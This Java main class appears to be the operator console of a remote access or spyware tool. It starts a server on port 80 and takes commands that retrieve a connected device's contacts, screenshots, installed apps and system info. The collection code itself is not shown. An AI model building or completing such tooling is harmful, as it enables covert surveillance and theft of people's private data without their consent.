package main;

import java.util.Scanner;

import cipher.RSADecryption;
import elements.Apps;
import elements.Contacts;


public class Main {
	
    private static final int portnumber = 80;
	
	public static void main(String[] args){
		String cadena = "";
		Contacts contacts;
		Apps apps;
		Scanner sc = new Scanner(System.in);
		Server Server = new Server(portnumber);
		Server.Start();
		while(!cadena.equals("0")){
			System.out.println("Introduce el comando que quieras ejecutar: ");
			switch(sc.nextLine()) {
				case "contacts":
					contacts = new Contacts(Server.GetContact());
					System.out.println(contacts.toString());
					break;
				case "screenshot":
					Server.GetScreenshot();
					break;
				case "apps":
					apps = new Apps(Server.GetAppsInstalled());
					System.out.println(apps.toString());
					break;
				case "info":
					String info = Server.getInfo();
					System.out.println(info);
					break;
				case "0":
					break;
				default:
					System.out.println("Comando no reconocido");
					break;
					
			}
		}
		Server.close();
	}

}
